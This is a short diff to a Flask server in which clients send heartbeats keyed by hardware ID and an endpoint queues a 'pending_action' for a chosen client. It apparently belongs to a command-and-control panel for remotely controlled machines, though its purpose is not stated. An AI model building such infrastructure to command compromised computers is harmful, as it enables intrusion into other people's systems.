@@ -40,8 +40,8 @@ def heartbeat():
     try:
         data = request.get_json(silent=True) or {}
         hwid = data.get("hwid")
+        ip = data.get("ip") or request.remote_addr
         if hwid and db:
-            ip = request.remote_addr
             db.collection('clients').document(hwid).set({
                 "ip": ip,
                 "status": "ONLINE"
@@ -56,12 +56,12 @@ def target_action():
         data = request.get_json(silent=True) or {}
         hwid = data.get("hwid")
         action = data.get("action")
-        if hwid and action and db:
+        if hwid and db:
             db.collection('clients').document(hwid).update({
                 "pending_action": action
             })
-            return jsonify({"message": f"Command [{action.upper()}] dispatched successfully"}), 200
-        return jsonify({"message": "Invalid HWID or Action"}), 400
+            return jsonify({"message": "Action updated successfully"}), 200
+        return jsonify({"message": "Invalid HWID"}), 400
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
